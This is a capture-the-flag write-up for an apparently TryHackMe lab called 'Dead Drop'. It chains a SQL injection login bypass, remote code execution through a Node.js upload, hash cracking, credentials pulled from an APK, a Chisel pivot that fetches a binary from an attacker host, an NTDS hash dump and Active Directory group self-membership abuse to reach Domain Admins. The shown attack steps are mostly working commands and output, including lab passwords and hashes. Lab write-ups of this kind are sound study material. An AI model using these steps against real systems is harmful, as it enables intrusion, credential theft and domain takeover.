# Dead Drop — CTF Writeup
**Platform:** TryHackMe  
**Difficulty:** Medium  
**Category:** Web · Active Directory · Pivoting

---

## Network Map

```
Internet
    └── WebServer (192.168.11.200) ← initial foothold
            └── Internal Network
                    ├── DEADDROP-DC   192.168.11.100  (Windows Server 2019 — DC)
                    └── DEADDROP-WRK  192.168.11.51
```

---

## 1. Reconnaissance — WebServer

```bash
nmap -sVC -p22,80 192.168.11.200 -n -Pn -oN service
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu
80/tcp open  http    Node.js Express framework
```

The web server exposes a login form at `/login`.

---

## 2. Web Exploitation

### 2.1 SQL Injection — Login Bypass

```
username=' OR 1=1--
password=x
```

Bypass successful → logged in as `admin`.

### 2.2 RCE via Node.js Module Upload

The dashboard allows file uploads. The server executes them as Node.js modules:

```javascript
const { execSync } = require('child_process');
const result = execSync('cat /etc/passwd').toString();
throw new Error(result);
```

Listing the root directory reveals a `backup/` folder:

```javascript
const result = execSync('ls backup/').toString();
// Output: shadow.bak
```

### 2.3 Shadow Hash Extraction

```javascript
const result = execSync('cat backup/shadow.bak').toString();
throw new Error(result);
```

```
svc-drop:$6$f1331af25300c7f3$7twueSf8eUyvgYnPWElPYpspGgBuYJ.TMGrPZ2OBC6pGq18ZGkkPke9S0tRlQ3EpiRLWEqhgnqkh2BOHfdCCH0:...
```

### 2.4 Hash Cracking

```bash
hashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt
```

```
svc-drop : dropsofjupiter
```

---

## 3. SSH Access — WebServer

```bash
ssh svc-drop@192.168.11.200
```

### 3.1 Hardcoded Credentials in APK

```bash
scp svc-drop@192.168.11.200:/home/svc-drop/backup/deaddrop-mobile.apk .
apktool d deaddrop-mobile.apk -o deaddrop/
grep -E "username|password" deaddrop/res/values/strings.xml
```

```xml
<string name="default_username">j.harris</string>
<string name="default_password">DropsOfJupiter2026!</string>
```

### 3.2 SQLite Database with Additional Credentials

```bash
scp svc-drop@192.168.11.200:/opt/app/db/deaddrop.db .
strings deaddrop.db
```

```
admin      : SuperSecretAdm1n!
svc-backup : BackupAgent2024
```

---

## 4. Pivoting — Chisel SOCKS5 Reverse Proxy

The WebServer has access to the internal `192.168.11.0/24` network.

**Kali (server):**
```bash
chisel server --port 1337 --reverse --socks5
```

**Victim (client):**
```bash
curl http://<KALI_IP>/chisel -o /tmp/chisel && chmod +x /tmp/chisel
./chisel client <KALI_IP>:1337 R:socks &
```

**`/etc/proxychains4.conf`:**
```ini
[ProxyList]
socks5  127.0.0.1  1080
```

---

## 5. Internal Network Reconnaissance

Nmap is unreliable over a SOCKS tunnel due to connection saturation.  
Use Python directly from the victim host instead:

```bash
python3 -c "
import socket
target = '192.168.11.100'
ports = [21,22,53,80,88,135,139,389,443,445,464,593,636,1433,3268,3269,3389,5985,9389]
for p in ports:
    try:
        s = socket.socket(); s.settimeout(1); s.connect((target, p)); print(f'[OPEN] {p}'); s.close()
    except: pass
"
```

```
[OPEN] 53   DNS
[OPEN] 88   Kerberos
[OPEN] 139  NetBIOS
[OPEN] 389  LDAP
[OPEN] 445  SMB
[OPEN] 3268 Global Catalog
[OPEN] 3389 RDP
[OPEN] 5985 WinRM
```

Classic Domain Controller fingerprint — Windows Server 2019.

---

## 6. SMB Enumeration — DEADDROP-DC

```bash
echo "192.168.11.100 DEADDROP-DC deaddrop.loc DEADDROP-DC.deaddrop.loc" | sudo tee -a /etc/hosts

proxychains netexec smb 192.168.11.100 \
  -u 'j.harris' -p 'DropsOfJupiter2026!' --shares
```

```
ADMIN$    READ,WRITE   Remote Admin
C$        READ,WRITE   Default share
NETLOGON  READ,WRITE   Logon server share
```

j.harris has **READ/WRITE on C$ and ADMIN$** → local administrator access.

### 6.1 NTDS Hash Dump

```bash
proxychains netexec smb 192.168.11.100 \
  -u 'j.harris' -p 'DropsOfJupiter2026!' --ntds
```

```
Administrator:500:aad3b435b51404ee:a42d71291745caecf02b93806a019292:::
krbtgt:502:aad3b435b51404ee:44455923f96a908df804161d2e771e62:::
j.harris:1103:aad3b435b51404ee:3405b47e83d3d15c023c767ac9ab77cc:::
m.chen:1107:...
r.patel:1108:...
s.wright:1109:...
```

---

## 7. Active Directory Privilege Escalation

### 7.1 WinRM Access

```bash
proxychains evil-winrm -i 192.168.11.100 -u j.harris -p 'DropsOfJupiter2026!'
```

### 7.2 ACL Enumeration with PowerView

```powershell
# Upload and import PowerView
upload /usr/share/powershell-empire/.../powerview.ps1
. .\PowerView.ps1

# Find ACLs held by j.harris over domain objects
Get-DomainObjectAcl -ResolveGUIDs | Where-Object {
  $_.SecurityIdentifier -eq (Get-DomainUser j.harris).objectsid
}
```

**Key findings:**

```
ObjectDN              : CN=ITSupport-Admins,CN=Users,DC=deaddrop,DC=loc
ActiveDirectoryRights : WriteProperty
ObjectAceType         : Self-Membership        ← AddSelf

ObjectDN              : CN=Domain Admins,CN=Users,DC=deaddrop,DC=loc
ActiveDirectoryRights : WriteProperty
ObjectAceType         : Self-Membership
```

### 7.3 Abusing Self-Membership (AddSelf)

j.harris holds the **Self-Membership** permission (also known as `AddSelf`) over the **ITSupport-Admins** group, which in turn has access to **Domain Admins**.

This permission allows a user to add themselves to a group without needing `GenericAll` or `GenericWrite`.

```powershell
# Step 1 — Add self to ITSupport-Admins
Add-ADGroupMember -Identity "ITSupport-Admins" -Members "j.harris"

# Step 2 — Escalate to Domain Admins
Add-ADGroupMember -Identity "Domain Admins" -Members "j.harris"

# Verify
net user j.harris /domain
```

### 7.4 Domain Controller Flag

Reconnect evil-winrm to refresh the token with the new group memberships:

```bash
proxychains evil-winrm -i 192.168.11.100 -u j.harris -p 'DropsOfJupiter2026!'
```

```powershell
type C:\Users\Administrator\Desktop\flag.txt
```

---

## 8. Attack Chain Summary

```
SQLi login bypass
    → Node.js RCE (shadow.bak)
        → SSH as svc-drop
            → APK reverse engineering → j.harris credentials
                → Chisel SOCKS5 pivot
                    → SMB Pwn3d! (C$ READ/WRITE)
                        → NTDS dump (all domain hashes)
                            → WinRM + PowerView
                                → Self-Membership on ITSupport-Admins
                                    → Domain Admins
                                        → FLAG
```

---

## 9. Credentials Collected

| User | Password / Hash | Service |
|---|---|---|
| `svc-drop` | `dropsofjupiter` | SSH WebServer |
| `admin` | `SuperSecretAdm1n!` | Web App |
| `svc-backup` | `BackupAgent2024` | Web App |
| `j.harris` | `DropsOfJupiter2026!` | AD / WinRM |
| `Administrator` | `a42d71291745caecf02b93806a019292` | NTLM Hash |
| `krbtgt` | `44455923f96a908df804161d2e771e62` | NTLM Hash |